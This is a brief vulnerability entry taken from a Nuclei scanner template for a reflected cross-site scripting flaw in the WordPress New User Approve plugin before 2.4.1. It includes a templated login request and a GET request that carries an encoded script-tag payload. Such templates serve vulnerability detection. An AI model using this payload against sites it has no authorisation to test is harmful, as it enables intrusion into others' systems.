# Vulnerability: WordPress New User Approve <2.4.1 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`new-user-approve-xss.yaml`)

## Description
WordPress New User Approve 2.4.1 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/index.php?a%22%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: {{Hostname}}
```

